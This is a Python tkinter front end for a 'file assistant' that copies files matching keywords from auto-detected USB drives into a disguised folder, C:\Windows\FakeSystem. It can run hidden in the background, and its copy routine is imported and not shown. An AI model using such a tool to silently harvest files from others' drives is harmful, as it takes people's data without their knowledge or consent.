import threading  # 导入线程模块
from tkinter import (Tk, Label, Entry, Button, Frame, font)  # 导入tkinter模块 处理GUI
from utils.module import multiFileCopy, selectFilePath, detectUsb  # 导入模块
from utils.secondaryWin import secondaryWindow  # 导入辅助窗口


# 选择文件夹路径
def selectPath():
   pathName = selectFilePath()  # 选择文件夹路径
   if pathName == "": return  # 如果没有选择路径，则不进行操作
   pathInput.delete(0, "end")  # 清空输入框
   pathInput.insert(0, pathName)  # 显示选择路径


# 选择盘符
def selectDrive():
    pathName = selectFilePath()  # 选择盘符路径
    if pathName == "": return  # 如果没有选择路径，则不进行操作
    if driveInput.get() != "": driveInput.insert(0, pathName + "|")  # 如果输入框有内容，插入分隔符 |
    else: driveInput.insert(0, pathName)  # 如果输入框为空，直接显示选择路径


# 开始运行
def run(type):
    try:
        keyWords = (keywordInput.get().strip('|').split('|') if keywordInput.get() else "")  # 如果没有输入关键字，则不进行文件名匹配
        storagePath = (pathInput.get() if pathInput.get() else "C:\\Windows\\FakeSystem")  # 如果没有输入存放路径，则默认为C:\Windows\FakeSystem
        driveLetter = (driveInput.get().strip('|').split('|') if driveInput.get() else True)  # 如果没有输入盘符，则默认为U盘
        if keyWords == "": return  # 如果没有输入关键字，则不进行文件名匹配

        if type:  window.destroy()  # 如果 type 为 True，则关闭主窗口后台运行
        else: window.withdraw()  # 隐藏主窗口

        if driveLetter == True: driveLetter = detectUsb()  # 如果没有输入盘符，则自动检测U盘
        runThread = threading.Thread(target=multiFileCopy, args=(driveLetter, keyWords, storagePath))  # 创建线程
        runThread.daemon = True
        runThread.start()  # 启动线程
        runThread.join()  # 等待线程结束
        window.deiconify()  # 显示主窗口
    except: pass


# 运行教程窗口
def tutorial():
    try: 
        runThread = threading.Thread(target=secondaryWindow)
        runThread.daemon = True
        runThread.start()
    except: pass


# 创建主窗口
window = Tk()
window.title("文件助手")
window.geometry("350x330")
window.resizable(False, False)
window.wm_attributes("-topmost", 1)

# 创建框架
frame = Frame(window, padx=10, pady=10)
frame.pack()

# 设置字体
customFont = font.Font(family="楷体", size=12)

# 添加文件名关键字标签和输入框
keywordTitle = Label(frame, text="文件名关键字:", font=customFont)
keywordTitle.grid(row=0, column=0, pady=20)
keywordInput = Entry(frame, font=customFont)
keywordInput.grid(row=0, column=1, pady=20)

# 添加选择存放路径按钮和路径输入框
pathButton = Button(frame, text="选择存放路径", command=selectPath, font=customFont,)
pathButton.grid(row=1, column=0, pady=10)
pathInput = Entry(frame, font=customFont)
pathInput.grid(row=1, column=1, pady=10)

# 添加选择盘符按钮和盘符输入框
driveButton = Button(frame, text="盘符(默认U盘)", command=selectDrive, font=customFont,)
driveButton.grid(row=2, column=0, pady=20)
driveInput = Entry(frame, font=customFont)
driveInput.grid(row=2, column=1, pady=20)

# 添加前台运行按钮
receptionDesk = Button(window, text="前台运行", command=lambda: run(False), width=10, font=customFont)
receptionDesk.pack(side="left", padx=(34, 5), pady=10)

# 添加后台运行按钮
runsBackground = Button(window, text="后台运行", command=lambda: run(True), width=10, font=customFont)
runsBackground.pack(side="right", padx=(5, 34), pady=10)

# 添加使用教程按钮
tutorialButton = Button(window, text="使用教程", command=tutorial, width=10, font=customFont)
tutorialButton.pack(padx=10, pady=10)

# 运行主循环
window.mainloop()
